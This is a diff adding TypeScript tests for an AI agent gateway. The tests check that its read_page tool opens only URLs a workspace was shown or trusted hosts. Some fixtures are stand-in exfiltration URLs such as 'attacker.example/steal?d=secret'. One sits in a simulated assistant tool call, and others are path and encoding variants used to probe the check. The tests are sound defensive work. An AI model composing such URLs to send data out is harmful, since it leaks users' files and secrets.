@@ -15,6 +15,7 @@ import { userPaths } from "../src/paths.ts";
 import { AGENT_UNKNOWN_GRACE_MS } from "../src/policy.ts";
 import type { SettingsObject } from "../src/agents/qwen-settings.ts";
 import { WorkspaceImageMissingError } from "../src/runtime.ts";
+import { formatResults, type SearchQuery } from "../src/search-mcp.ts";
 import { createServiceServer } from "../src/service-api.ts";
 import { DeletingError, WorkspaceManager, type WorkspaceInfo } from "../src/workspaces.ts";
 import { closeServer, listenLocal } from "./fakes.ts";
@@ -1407,6 +1408,106 @@ function mcpOn(gw: Gateway, body: unknown): Promise<Reply> {
   });
 }
 
+test("read_page opens what a workspace was shown (search results, pages, its conversation) and trusted sites, nothing it composed", () => {
+  const reads: Array<{ url: string; redirectHosts: readonly string[] | null | undefined }> = [];
+  const reader = {
+    async read(url: string, _signal: AbortSignal, options?: { redirectHosts: readonly string[] | null }) {
+      reads.push({ url, redirectHosts: options?.redirectHosts });
+      return { url, kind: "html", title: "Page", text: "See also https://linked.example/next for more.", truncated: false, note: "" };
+    },
+  };
+  // The real formatter over one fixed result: like SearXNG's answers, it repeats the query.
+  const search = { search: async (query: SearchQuery) => formatResults(query, query.query.includes("nothing") ? {} : { results: [{ title: "Found", url: "https://found.example/page", content: "A page." }] }) };
+  return withGateway({ env: { READER_URL: "http://127.0.0.1:9", READER_TRUSTED_HOSTS: "docs.example" }, reader, search }, async (gw) => {
+    const { alice, bob } = gw.ids;
+    await gw.startReady(alice);
+    const tool = async (name: string, args: unknown) =>
+      json<{ result: { content: Array<{ text: string }>; isError?: boolean } }>(await mcpOn(gw, { jsonrpc: "2.0", id: 1, method: "tools/call", params: { name, arguments: args } })).result;
+    const readPage = async (url: string): Promise<boolean> => (await tool("read_page", { url })).isError !== true;
+
+    gw.caller.userId = alice;
+    const list = json<{ result: { tools: Array<{ name: string }> } }>(await mcpOn(gw, { jsonrpc: "2.0", id: 1, method: "tools/list" }));
+    assert.deepEqual(list.result.tools.map((entry) => entry.name), ["web_search", "read_page"]);
+
+    const composed = await tool("read_page", { url: "https://attacker.example/collect?d=contents-of-a-file" });
+    assert.equal(composed.isError, true);
+    assert.match(composed.content[0]!.text, /only opens pages you were shown/);
+    assert.equal(reads.length, 0, "a URL the model composed never reaches the reader");
+    assert.ok(logged(gw, "page read refused: not a URL the workspace was shown"));
+
+    assert.equal(await readPage("https://docs.example/api/anything?the=model&made=up"), true, "a trusted site is open as a whole");
+    assert.deepEqual(reads.at(-1), { url: "https://docs.example/api/anything?the=model&made=up", redirectHosts: ["docs.example"] }, "but may not redirect off the trusted sites");
+
+    // A URL the model puts into a search query is its own, although the answer repeats it.
+    for (const query of ["nothing https://attacker.example/collect?d=contents-of-a-file", "see https://attacker.example/collect?d=contents-of-a-file"]) {
+      await tool("web_search", { query });
+      assert.equal(await readPage("https://attacker.example/collect?d=contents-of-a-file"), false, query);
+    }
+    assert.equal(await readPage("http://found.example/page/"), true, "a search result, spelled a little differently");
+    assert.deepEqual(reads.at(-1), { url: "https://found.example/page", redirectHosts: null }, "requested as it was shown; a URL that was shown may redirect anywhere");
+    // The check and the request use one reading of the URL: nothing the model adds to a shown URL is sent.
+    for (const spelling of ["https://found.example/contents-of-a-file/../page", "https://found.example/contents-of-a-file/%2e%2e/page", "https://found.example/page#contents-of-a-file", "HTTPS://FOUND.example:443/page"]) {
+      assert.equal(await readPage(spelling), true, spelling);
+      assert.equal(reads.at(-1)!.url, "https://found.example/page", spelling);
+    }
+    for (const composed of ["https://found.example/page?d=contents-of-a-file", "https://found.example/page//", "https://found.example/page/contents-of-a-file", "https://found.example./other"]) {
+      assert.equal(await readPage(composed), false, composed);
+    }
+    assert.equal(await readPage("https://found.example/other"), false, "another page of that site was not shown");
+    assert.equal(await readPage("https://linked.example/next"), true, "a link on a page it read");
+    // A host is trusted, and asked for, in the spelling the gateway resolved it to.
+    assert.equal(await readPage("https://do\u115fcs.example/a/../b"), true);
+    assert.deepEqual(reads.at(-1), { url: "https://docs.example/b", redirectHosts: ["docs.example"] });
+
+    // What the user typed and what tools printed reach the model in its LLM requests.
+    const chat = await request(gw.ports.service, {
+      method: "POST",
+      path: "/llm/v1/chat/completions",
+      headers: { "content-type": "application/json" },
+      body: JSON.stringify({
+        model: "m",
+        messages: [
+          { role: "user", content: "Summarise https://pasted.example/post for me" },
+          { role: "assistant", content: "Opening https://attacker.example/steal?d=secret", tool_calls: [{ type: "function", function: { name: "read_page", arguments: '{"url":"https://attacker.example/steal?d=secret"}' } }] },
+          { role: "tool", content: "error: see https://errors.example/E42" },
+        ],
+      }),
+    });
+    assert.equal(chat.status, 200);
+    assert.equal(await readPage("https://pasted.example/post"), true, "a URL the user pasted");
+    assert.equal(await readPage("https://errors.example/E42"), true, "a URL in tool output");
+    assert.equal(await readPage("https://attacker.example/steal?d=secret"), false, "writing a URL does not make it one the model was shown");
+
+    gw.caller.userId = bob;
+    assert.equal(await readPage("https://pasted.example/post"), false, "what one workspace was shown opens nothing for another");
+    assert.equal(await readPage("https://docs.example/"), true);
+    assert.equal(gw.info(alice).lastActivityAt, gw.clock.now);
+  });
+});
+
+test("READER_URL_POLICY=any lets a workspace read every page; without a reader there is no read_page", async () => {
+  const reads: string[] = [];
+  const reader = {
+    async read(url: string) {
+      reads.push(url);
+      return { url, kind: "html", title: "", text: "text", truncated: false, note: "" };
+    },
+  };
+  await withGateway({ env: { READER_URL: "http://127.0.0.1:9", READER_URL_POLICY: "any" }, reader }, async (gw) => {
+    gw.caller.userId = gw.ids.alice;
+    const reply = json<{ result: { isError?: boolean } }>(await mcpOn(gw, { jsonrpc: "2.0", id: 1, method: "tools/call", params: { name: "read_page", arguments: { url: "https://anything.example/x?y=z" } } }));
+    assert.equal(reply.result.isError, undefined);
+    assert.deepEqual(reads, ["https://anything.example/x?y=z"]);
+  });
+  await withGateway({}, async (gw) => {
+    gw.caller.userId = gw.ids.alice;
+    const list = json<{ result: { tools: Array<{ name: string }> } }>(await mcpOn(gw, { jsonrpc: "2.0", id: 1, method: "tools/list" }));
+    assert.deepEqual(list.result.tools.map((entry) => entry.name), ["web_search"]);
+    const reply = json<{ result: { isError?: boolean } }>(await mcpOn(gw, { jsonrpc: "2.0", id: 2, method: "tools/call", params: { name: "read_page", arguments: { url: "https://docs.python.org/" } } }));
+    assert.equal(reply.result.isError, true);
+  });
+});
+
 test("CPU use, averaged between two samples, counts as work", () =>
   withGateway({}, async (gw) => {
     const { alice } = gw.ids;
@@ -1460,6 +1561,35 @@ test("CPU use, averaged between two samples, counts as work", () =>
     await gw.manager.reap();
     assert.equal(gw.info(alice).status, "stopped");
     assert.equal(gw.info(alice).stopReason, "idle");
+  }));
+
+test("after a gateway restart, a Qwen workspace nobody is using is adopted, not removed", () =>
+  withGateway({}, async (gw) => {
+    const { alice } = gw.ids;
+    await gw.startReady(alice);
+    const container = gw.runtime.containerFor(alice).id;
+    // No session is open, so `qwen serve` has stopped its agent process. It starts it again for the
+    // next session. The gateway used to wait 90 s for that process and then remove the workspace.
+    gw.runtime.qwenFor(alice).health.channelAlive = false;
+
+    gw.manager.shutdown();
+    const fresh = new WorkspaceManager({
+      config: gw.config,
+      db: gw.db,
+      runtime: gw.runtime,
+      llm: gw.llmQueue,
+      connections: gw.connections,
+      log: gw.log,
+      now: () => gw.clock.now,
+    });
+    await fresh.init();
+    gw.useManager(fresh);
+    await gw.waitReady(alice);
+
+    assert.equal(fresh.info(alice).status, "running");
+    assert.equal(fresh.info(alice).lastError, null);
+    assert.equal(gw.runtime.containers.has(container), true);
+    assert.equal(gw.runtime.starts.length, 1, "nothing was started again");
   }));
 
 test("after a gateway restart, running containers are adopted with their token and the rest removed", () =>
